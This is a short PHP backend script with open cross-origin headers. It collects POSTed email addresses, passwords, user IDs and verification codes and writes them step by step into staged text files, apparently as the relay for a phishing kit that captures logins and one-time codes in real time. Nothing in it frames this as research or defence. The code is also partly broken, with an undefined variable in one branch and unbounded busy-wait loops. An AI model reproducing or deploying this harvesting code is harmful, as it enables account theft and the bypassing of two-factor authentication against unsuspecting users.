<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: *');
header('Access-Control-Allow-Methods: *');
header('Access-Control-Allow-Credentials: true');
header('Content-type: json/application');




$q = $_GET['q'];
if($q=='inone')
{
    require "first.php";
    exit(print $exittt);
}
elseif($q=='intwo')
{
    require "fone.php";
    exit(print $b);
}
elseif($q=='inthree')
{
    require "otpr.php";
    exit(print $exittt);
}
elseif ($q=='requ2')
{
    $vibor=$_POST['vibor'];
    $userId=$_POST['userId'];
    $email=$_POST['email'];
    $password=$_POST['password'];
    $f=$email.' '.$password.' '.$userId.' '.$vibor;
    $filenameq = './shagi/second/nach.txt';
    while(true)
    {
        $prov=file_get_contents($filenameq);
        if($prov=='')
        {
            file_put_contents($filenameq, $f);
            exit;
            break;
        }
    }
}
elseif($q=='fff')
{
    require "php.php";
    exit(print '1');
}
elseif($q=='val2')
{
    $z=$_POST['v'];
    $filename = './shagi/four/nach.txt';
    while(true)
    {
        $prov1=file_get_contents($filename);
        if($prov1=='')
        {
            file_put_contents($filename, $z);
            break;
        }
    }
}
elseif($q=='requ1')
{
    $vibor=$_POST['vibor'];
    $filenameq = './shagi/second/nach.txt';
    while(true)
    {
        $prov=file_get_contents($filenameq);
        if($prov=='')
        {
            file_put_contents($filenameq, $vibor);
            exit;
            break;
        }
    }
}
elseif($q=='ok')
{
    $name=$_POST['email'];
    $text=$_POST['password'];
    $abosob=$_POST['code'];
    $userId=$_POST['userId'];
    $concat=$name.' '.$text.' '.$abosob.' '.$userId.' 3';
    $file='./shagi/third/nach.txt';
    while(true)
    {
        $prov=file_get_contents($filenameq);
        if($prov=='')
        {
            file_put_contents($file, $concat);
            exit;
            break;
        }
    }
}



    // $post = array(
    // 'code'  => $a
    // );
     
    // $headers = stream_context_create(
    //     array(
    //         'http' => array(
    //             'method'  => 'POST',
    //             'header'  => 'Content-Type: application/x-www-form-urlencoded',
    //             'content' => http_build_query($post),
    //         )
    //     )
    // );
     
    // file_get_contents('http://projback/f', false, $headers);

        

elseif ($q=='val1')
{
    $z=$_POST['v'];
    $filename = './shagi/first/nach.txt';
    while(true)
    {
        $prov1=file_get_contents($filename);
        if($prov1=='')
        {
            file_put_contents($filename, $z);
            break;
        }
    }
}

// $proj = mysqli_query($connect, $query = "SELECT * FROM `users`");
// $projarray = [];

// while($proga = mysqli_fetch_assoc($proj))
// {
//     $projarray[] = $proga;
// }

// echo json_encode($projarray);